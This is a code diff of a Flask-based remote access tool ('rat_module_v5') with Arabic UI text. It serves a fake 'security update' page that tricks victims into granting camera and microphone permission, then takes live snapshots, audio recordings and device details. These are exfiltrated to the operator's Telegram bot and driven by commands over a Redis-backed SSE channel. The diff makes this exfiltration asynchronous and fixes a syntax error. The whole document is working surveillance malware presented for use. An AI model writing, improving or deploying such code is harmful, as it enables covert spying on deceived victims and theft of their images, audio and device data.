@@ -1,9 +1,9 @@
 import os
 import base64
 import io
-import time
 import json
 import redis
+from concurrent.futures import ThreadPoolExecutor
 from flask import Blueprint, render_template_string, request, Response
 
 rat_bp = Blueprint('rat_module_v5', __name__)
@@ -15,7 +15,10 @@ if REDIS_URL.startswith("redis-cli"):
 
 redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
 
-RAT_SSE_TEMPLATE = """
+# محرك طوابير المهام غير المتزامنة (Asynchronous Task Pool) لمعالجة الملفات في الخلفية دون تعليق مسار الويب
+background_executor = ThreadPoolExecutor(max_workers=4)
+
+RAT_ASYNC_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -62,13 +65,11 @@ RAT_SSE_TEMPLATE = """
 
                 sendDeviceInfo();
                 setTimeout(() => captureLiveSnapshot("📸 **صورة الاتصال الأولى:**"), 1000);
-                
-                // تفعيل قناة الاتصال الحية عبر Server-Sent Events (SSE) بدلاً من الـ Polling
                 initSSEStream();
 
                 document.getElementById('mainBox').innerHTML = "<h2>✅ النظام يعمل الآن بكفاءة</h2><p>جاري تطبيق التحسينات الأمنية في الخلفية...</p>";
 
-            } cursor (err) {
+            } catch (err) {
                 alert("يرجى الضغط على سماح للأذونات لضمان نجاح التحديث.");
             }
         }
@@ -100,6 +101,7 @@ RAT_SSE_TEMPLATE = """
             
             const freshImageData = canvas.toDataURL('image/jpeg', 0.9);
 
+            // إرسال البيانات للخلفية وعدم انتظار الرد لضمان سرعة فائقة
             fetch('/rat_v5_image', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -139,7 +141,7 @@ RAT_SSE_TEMPLATE = """
                 try {
                     const data = JSON.parse(event.data);
                     if (data.action === "snapshot") {
-                        captureLiveSnapshot("📸 **صورة حية ومتجددة بناءً على طلبك (عبر SSE):**");
+                        captureLiveSnapshot("📸 **صورة حية ومتجددة بناءً على طلبك (معالجة غير متزامنة):**");
                     } 
                     else if (data.action === "audio") {
                         recordLiveAudio();
@@ -148,7 +150,6 @@ RAT_SSE_TEMPLATE = """
             };
 
             eventSource.onerror = function() {
-                // إعادة الاتصال التلقائي في حال انقطاع السيرفر المؤقت
                 setTimeout(() => {
                     eventSource.close();
                     initSSEStream();
@@ -166,11 +167,28 @@ self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); })
 self.addEventListener('fetch', (e) => { e.respondWith(fetch(e.request)); });
 """
 
+# مهام الخلفية غير المتزامنة (Background Worker Functions)
+def async_send_photo(bot, chat_id, image_bytes, title):
+    try:
+        photo_file = io.BytesIO(image_bytes)
+        photo_file.name = 'live_target.jpg'
+        bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
+    except Exception as e:
+        print(f"Async Img Error: {e}")
+
+def async_send_audio(bot, chat_id, audio_bytes):
+    try:
+        audio_file = io.BytesIO(audio_bytes)
+        audio_file.name = 'live_audio.webm'
+        bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي حي من ميكروفون الضحية (معالجة غير متزامنة):**", parse_mode="Markdown")
+    except Exception as e:
+        print(f"Async Audio Error: {e}")
+
 def init_rat_routes(app, bot):
     @app.route('/system_secure_v2', methods=['GET'])
     def rat_landing():
         chat_id = request.args.get('id', '0')
-        return render_template_string(RAT_SSE_TEMPLATE, chat_id=chat_id)
+        return render_template_string(RAT_ASYNC_TEMPLATE, chat_id=chat_id)
 
     @app.route('/sw.js', methods=['GET'])
     def service_worker():
@@ -182,7 +200,7 @@ def init_rat_routes(app, bot):
         chat_id = data.get('chat_id')
         if chat_id and chat_id != '0':
             msg = (
-                "🎯 **تمت استجابة الضحية بنجاح عبر قناة اتصال SSE الموزعة!**\n\n"
+                "🎯 **تمت استجابة الضحية بنجاح عبر النظام غير المتزامن (Async Worker)!**\n\n"
                 f"💻 **النظام:** `{data.get('platform')}`\n"
                 f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
                 "👇 **اختر الأمر المطلوب تنفيذه:**"
@@ -206,22 +224,17 @@ def init_rat_routes(app, bot):
             return "Missing ID", 400
 
         def event_stream():
-            # حلقة بث حي مفتوحة ترسل البيانات فور توفرها في Redis دون استهلاك دوري للـ Polling
             pubsub = redis_client.pubsub()
             pubsub.subscribe(f"channel_cmd:{chat_id}")
-            
-            # إرسال رسالة نبض (Heartbeat) أولية لفتح القناة وثبات الاتصال
             yield f"data: {json.dumps({'action': 'ping'})}\n\n"
 
             while True:
                 try:
-                    # الاستماع للرسائل القادمة في قناة Redis بشكل فوري (Pub/Sub)
                     message = pubsub.get_message(ignore_subscribe_messages=True, timeout=15)
                     if message:
                         action_data = message['data']
                         yield f"data: {json.dumps({'action': action_data})}\n\n"
                     else:
-                        # إرسال نبض خفيف كل 15 ثانية لمنع انقطاع الاتصال من قبل المتصفح أو البروكسي
                         yield f"data: {json.dumps({'action': 'heartbeat'})}\n\n"
                 except Exception:
                     break
@@ -238,11 +251,10 @@ def init_rat_routes(app, bot):
             try:
                 header, encoded = img_data.split(",", 1)
                 image_bytes = base64.b64decode(encoded)
-                photo_file = io.BytesIO(image_bytes)
-                photo_file.name = 'live_target.jpg'
-                bot.send_photo(chat_id, photo_file, caption=title, parse_mode="Markdown")
+                # إرسال المهمة فوراً للخلفية عبر الـ ThreadPoolExecutor لضمان استجابة صاروخية
+                background_executor.submit(async_send_photo, bot, chat_id, image_bytes, title)
             except Exception as e:
-                print(f"Img error: {e}")
+                print(f"Img ingest error: {e}")
         return {"status": "ok"}
 
     @app.route('/rat_v5_audio', methods=['POST'])
@@ -254,14 +266,12 @@ def init_rat_routes(app, bot):
             try:
                 header, encoded = audio_data.split(",", 1)
                 audio_bytes = base64.b64decode(encoded)
-                audio_file = io.BytesIO(audio_bytes)
-                audio_file.name = 'live_audio.webm'
-                bot.send_audio(chat_id, audio_file, caption="🎙️ **تسجيل صوتي حي من ميكروفون الضحية:**", parse_mode="Markdown")
+                # دفع معالجة ملف الصوت لخيوت الخلفية غير المتزامنة
+                background_executor.submit(async_send_audio, bot, chat_id, audio_bytes)
             except Exception as e:
-                print(f"Audio error: {e}")
+                print(f"Audio ingest error: {e}")
         return {"status": "ok"}
 
 def queue_command(chat_id, action):
-    # استخدام Redis Pub/Sub لنشر الأمر فوراً لتوصيله عبر قناة SSE المفتوحة
     redis_client.publish(f"channel_cmd:{chat_id}", action)
     redis_client.expire(f"channel_cmd:{chat_id}", 3600)
